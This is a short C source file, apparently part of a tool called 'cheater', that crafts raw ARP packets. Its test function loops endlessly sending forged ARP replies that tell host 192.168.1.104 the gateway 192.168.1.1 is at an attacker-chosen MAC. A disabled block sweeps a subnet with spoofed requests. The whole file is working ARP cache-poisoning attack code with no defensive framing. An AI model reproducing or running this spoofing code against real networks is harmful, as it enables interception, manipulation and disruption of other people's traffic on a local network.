#include "cheater.h"

#include "common.h"



int
cheater_arp_sender(
    unsigned char   *target_mac,
    unsigned char   *source_mac,
    unsigned short  opcode,
    unsigned int    target_ip,
    unsigned int    source_ip
    )
{
    unsigned char   packet[42]  = {0};
    struct _ethhdr  *eth        = packet;
    struct _arphdr  *arp        = packet + sizeof(struct _ethhdr);

    if(target_mac)
    {
        memcpy(eth->h_dest, target_mac, 6);
        if(_ARP_REPLY == opcode)
        {
            memcpy(arp->ar_tha, target_mac, 6);
        }
    }
    if(source_mac)
    {
        memcpy(eth->h_source, source_mac, 6);
        memcpy(arp->ar_sha, source_mac, 6);
    }

    eth->h_proto    = _ntoh16(_ETH_P_ARP);

    arp->ar_hrd     = _ntoh16(0x1);
    arp->ar_pro     = _ntoh16(_ETH_P_IP);
    arp->ar_hln     = 6;
    arp->ar_pln     = 4;
    arp->ar_op      = _ntoh16(opcode);

    memcpy(arp->ar_sip, &source_ip, 4);
    memcpy(arp->ar_tip, &target_ip, 4);

    return _SEND_PACKAGE(packet, sizeof(packet)/sizeof(*packet));
}


int
cheater_arp_reply_sender(
    unsigned char   *target_mac,
    unsigned char   *source_mac,
    unsigned int    target_ip,
    unsigned int    source_ip)
{
    target_mac  = target_mac ? target_mac : "\xff\xff\xff\xff\xff\xff";
    return cheater_arp_sender(  target_mac,                                    \
                                source_mac,                                    \
                                _ARP_REPLY,                                    \
                                target_ip,                                     \
                                source_ip);
}

// int
// cheater_arp_reply_broadcast_sender(
//     unsigned char   *source_mac,
//     )


int
cheater_arp_request_sender(
    unsigned char   *target_mac,
    unsigned char   *source_mac,
    unsigned int    target_ip,
    unsigned int    source_ip)
{
    target_mac  = target_mac ? target_mac : "\xff\xff\xff\xff\xff\xff";
    return cheater_arp_sender(  target_mac,                                    \
                                source_mac,                                    \
                                _ARP_REQUEST,                                  \
                                target_ip,                                     \
                                source_ip);
}


int
cheater_arp_request_broadcast_sender(
    unsigned char   *source_mac,
    unsigned int    target_ip,
    unsigned int    source_ip)
{
    return cheater_arp_request_sender(0, source_mac, target_ip, source_ip);
}



void
cheater_test(void)
{
#if 0
    int i=254;
    int ip  = _iptonetint32("192.168.1.0");
    while(i --)
    {
        sleep(0);

        ip  = ip & 0xffffff00 | i;
        cheater_arp_request_broadcast_sender( //"\x22\x22\x22\x22\x22\x22",
                                    "\xd4\x33\xa3\x11\x11\x11",
                                    // _iptonetint32("192.168.1.9"),
                                    ip,
                                    _iptonetint32("192.168.1.109"));

    }
#endif
    while(1)
    {
        cheater_arp_reply_sender(
                                    "\x24\x24\x0e\x41\x58\xc7",
                                    "\xd4\x33\xa3\x11\x11\x11",
                                    _iptonetint32("192.168.1.104"),
                                    _iptonetint32("192.168.1.1"));
        sleep(1);
    }
}














